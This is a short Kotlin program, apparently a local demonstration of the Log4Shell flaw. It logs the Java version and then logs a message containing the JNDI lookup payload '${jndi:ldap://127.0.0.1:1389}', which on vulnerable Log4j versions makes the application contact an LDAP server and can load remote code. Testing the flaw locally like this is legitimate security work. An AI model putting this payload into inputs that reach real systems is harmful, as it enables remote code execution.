import org.apache.logging.log4j.kotlin.logger

object Main {
    val logger = logger("log4shell")
    @JvmStatic
    fun main(args: Array<String>) {
        logger.info("Java version: " + System.getProperty("java.runtime.version"))
        logger.info("Received a request for API version \${jndi:ldap://127.0.0.1:1389}")
    }
}
